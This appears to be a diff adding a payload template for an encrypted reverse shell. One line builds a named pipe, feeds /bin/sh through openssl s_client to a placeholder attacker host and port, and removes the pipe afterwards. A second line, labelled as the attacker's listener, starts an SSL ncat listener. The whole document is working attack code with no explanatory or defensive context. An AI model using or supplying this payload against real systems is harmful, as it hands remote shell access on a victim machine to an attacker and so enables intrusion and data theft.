@@ -1,0 +1,4 @@
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect #{LHOST}:#{LPORT} > /tmp/s; rm /tmp/s
+
+# desc: Listener (attacker) 
+ncat --ssl -vv -l -p #{LPORT}
